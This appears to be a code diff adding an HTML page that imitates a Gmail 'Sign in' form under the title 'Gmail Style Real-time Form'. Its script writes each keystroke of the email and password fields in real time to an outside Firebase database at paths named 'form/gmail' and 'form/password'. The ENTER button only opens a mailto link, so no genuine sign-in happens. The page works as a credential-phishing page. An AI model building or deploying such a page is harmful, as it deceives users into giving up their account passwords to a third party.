@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Gmail Style Real-time Form</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      background-color: #f5f5f5;
+      font-family: 'Roboto', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: white;
+      padding: 40px 50px;
+      border-radius: 8px;
+      box-shadow: 0 8px 24px rgba(32,33,36,0.28);
+      width: 400px;
+      max-width: 90vw;
+    }
+    h1#colorfulTitle {
+      font-weight: 400;
+      margin-bottom: 30px;
+      font-size: 24px;
+      text-align: center;
+      user-select: none;
+    }
+    label {
+      display: block;
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 6px;
+      font-weight: 500;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 12px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      transition: border-color 0.3s ease;
+      outline: none;
+      box-sizing: border-box;
+      margin-bottom: 28px;
+    }
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0 5px #1a73e8aa;
+    }
+    input::placeholder {
+      color: #aab0b6;
+    }
+    #openGmailBtn {
+      background-color: #1a73e8; 
+      color: white; 
+      border: none; 
+      padding: 10px 16px; 
+      font-size: 14px; 
+      border-radius: 4px; 
+      cursor: pointer;
+      user-select: none;
+      margin-top: 10px;
+      text-align: left;
+    }
+    #openGmailBtn:hover {
+      background-color: #1669c1;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1 id="colorfulTitle">Sign in</h1>
+
+    <label for="gmailInput">Email or phone</label>
+    <input
+      type="email"
+      id="gmailInput"
+      placeholder="Enter your Gmail"
+      autocomplete="off"
+      spellcheck="false"
+      autocorrect="off"
+    />
+
+    <label for="passwordInput">Password</label>
+    <input
+      type="password"
+      id="passwordInput"
+      placeholder="Enter your password"
+      autocomplete="off"
+      spellcheck="false"
+      autocorrect="off"
+    />
+
+    <p style="font-size: 12px; color: #5f6368; margin-top: -20px; margin-bottom: 30px; line-height: 1.4;">
+      By continuing, you agree to our <a href="#" style="color: #1a73e8; text-decoration: none;">Privacy Policy</a> and <a href="#" style="color: #1a73e8; text-decoration: none;">Terms of Service</a>.
+    </p>
+
+    <div style="text-align: left;">
+      <button id="openGmailBtn">ENTER</button>
+    </div>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
+    import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyBeDy5M-J3RPXl7yaDE5T1Tdr6tU5fYWbo",
+      authDomain: "node-64b26.firebaseapp.com",
+      databaseURL: "https://node-64b26-default-rtdb.firebaseio.com",
+      projectId: "node-64b26",
+      storageBucket: "node-64b26.appspot.com",
+      messagingSenderId: "86827707003",
+      appId: "1:86827707003:web:eb3dfc18005147791690de",
+      measurementId: "G-7P23KCSKSE"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+
+    const gmailInput = document.getElementById("gmailInput");
+    const passwordInput = document.getElementById("passwordInput");
+
+    const gmailRef = ref(database, "form/gmail");
+    const passwordRef = ref(database, "form/password");
+
+    onValue(gmailRef, (snapshot) => {
+      const val = snapshot.val() || "";
+      if (gmailInput.value !== val) {
+        gmailInput.value = val;
+      }
+    });
+
+    onValue(passwordRef, (snapshot) => {
+      const val = snapshot.val() || "";
+      if (passwordInput.value !== val) {
+        passwordInput.value = val;
+      }
+    });
+
+    gmailInput.addEventListener("input", () => {
+      set(gmailRef, gmailInput.value);
+    });
+
+    passwordInput.addEventListener("input", () => {
+      set(passwordRef, passwordInput.value);
+    });
+
+    // Colorful "Sign in" title
+    const colorfulTitle = document.getElementById("colorfulTitle");
+    const colors = ['#4285F4', '#DB4437', '#F4B400', '#0F9D58', '#673AB7', '#E91E63'];
+
+    function makeColorful(text) {
+      colorfulTitle.innerHTML = '';
+      for(let i = 0; i < text.length; i++) {
+        const span = document.createElement('span');
+        span.textContent = text[i];
+        span.style.color = colors[i % colors.length];
+        colorfulTitle.appendChild(span);
+      }
+    }
+
+    makeColorful(colorfulTitle.textContent);
+
+    // ENTER button opens mail client with Gmail entered
+    const openGmailBtn = document.getElementById("openGmailBtn");
+    openGmailBtn.addEventListener("click", () => {
+      const email = gmailInput.value.trim();
+      if(email) {
+        window.location.href = `mailto:${email}`;
+      } else {
+        alert("Please enter a valid Gmail address first.");
+      }
+    });
+  </script>
+</body>
+</html>
